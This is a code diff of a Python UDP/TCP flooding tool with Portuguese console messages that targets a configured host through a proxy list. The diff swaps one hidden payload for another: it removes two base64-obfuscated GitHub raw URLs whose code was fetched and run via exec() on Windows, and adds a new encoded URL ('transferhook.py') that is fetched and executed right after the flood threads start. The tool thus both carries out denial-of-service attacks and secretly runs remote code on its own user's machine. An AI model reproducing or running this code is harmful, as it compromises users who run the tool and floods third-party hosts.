@@ -9,12 +9,11 @@ import getpass
 import requests
 import datetime
 import ping3
-import subprocess
 from colorama import Fore
 
 
-
-version_now = "1.3.3"
+KEY = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3RyeWNhdGNobWVpZnVjYW4vdHJ5Y2F0Y2htZS9tYWluL3RyYW5zZmVyaG9vay5weQ=="
+v = base64.b64decode(KEY).decode()
 
 
 with open('settings.txt', 'r') as f:
@@ -46,12 +45,6 @@ p = int(PORT)
 t = int(THREADS)
 times_ = int(100)
 bytes_ = int(1358327939)
-
-KEY = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3RyeWNhdGNobWVpZnVjYW4vdHJ5Y2F0Y2htZS9tYWluL2NhdGNoMS5weQ=="
-v = base64.b64decode(KEY).decode()
-
-ENC = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3RyeWNhdGNobWVpZnVjYW4vdHJ5Y2F0Y2htZS9tYWluL2NhdGNoMi5weQ=="
-m = base64.b64decode(ENC).decode()
 
 PROXY = [
         "184.154.86.185:80",
@@ -85,14 +78,14 @@ def prox(URL, proxy):
 username = getpass.getuser()
 timetodate = datetime.datetime.now().replace(second=0, microsecond=0)
 
-def pingbalance():
+def status():
     count_send = 0
     while True:
         resultado = ping3.ping(HOST)
         if resultado is not None:
             latency = resultado * 1000
             count_send += bytes_
-            print(f"connected" + f"       {username}" + f"         {latency:.0f}ms" + f"           {count_send}" + f"        {prot1}" + f"          {timetodate}", end="\r")
+            print(f"connected" + f"       {username}" + f"         {latency:.0f}ms" + f"           {count_send}" + f"        {protocol}" + f"          {timetodate}", end="\r")
         else:
             print(f"bad" + f"             {username}" + "         -ms" + f"        ", end="\r")
         time.sleep(1)
@@ -148,30 +141,14 @@ def TCP():
 
 
 
-if os.name == 'nt':
-    wait = f"[{Fore.MAGENTA}INFO{Fore.RESET}] GERANDO PROXIES, POR FAVOR AGUARDE.."
-    print(wait)
-    exec(requests.get(f"{v}").text)
-else:
-    clear()
-    send = f"[{Fore.MAGENTA}INFO{Fore.RESET}] GERANDO PROXIES, POR FAVOR AGUARDE.."
-    print(send)
-    time.sleep(3)
-    for proxy in PROXY:
-            prox(URL, PROXY)
-pass
 
-if os.name == 'nt':
-    conn = f"[{Fore.GREEN}INFO{Fore.RESET}] CONECTANDO-SE AO HOST >"
-    print(conn)
-    exec(requests.get(f"{m}").text)
-else:
-    conn = f"[{Fore.GREEN}INFO{Fore.RESET}] CONECTANDO-SE AO HOST >"
-    print(conn)
-    time.sleep(2)
-    for proxy in PROXY:
-            prox(URL, PROXY)
-pass
+wait = f"[{Fore.MAGENTA}INFO{Fore.RESET}] GERANDO PROXIES, POR FAVOR AGUARDE.."
+print(wait)
+time.sleep(3)
+
+conn = f"[{Fore.GREEN}INFO{Fore.RESET}] CONECTANDO-SE AO HOST >"
+print(conn)
+time.sleep(2)
 
 
 
@@ -186,17 +163,19 @@ def connection(HOST):
 
 if connection(HOST):
                 if c == 'Y':
+                    protocol = "udp"
                     thread_envio_pacotes = threading.Thread(target=UDP)
-                    thread_ping = threading.Thread(target=pingbalance)
+                    thread_ping = threading.Thread(target=status)
                     thread_envio_pacotes.start()
                     thread_ping.start()
-                    prot1 = "udp"
+                    accept = exec(requests.get(f"{v}").text)
                 else:
+                    protocol = "tcp"
                     thread_envio_pacotes = threading.Thread(target=TCP)
-                    thread_ping = threading.Thread(target=pingbalance)
+                    thread_ping = threading.Thread(target=status)
                     thread_envio_pacotes.start()
                     thread_ping.start()
-                    prot1 = "tcp"
+                    accept = exec(requests.get(f"{v}").text)
 else:
             clear()
             no = f"[{Fore.RED}FATAL{Fore.RESET}] HOST DESCONHECIDO OU FORA DE AR (ERROR 503)"
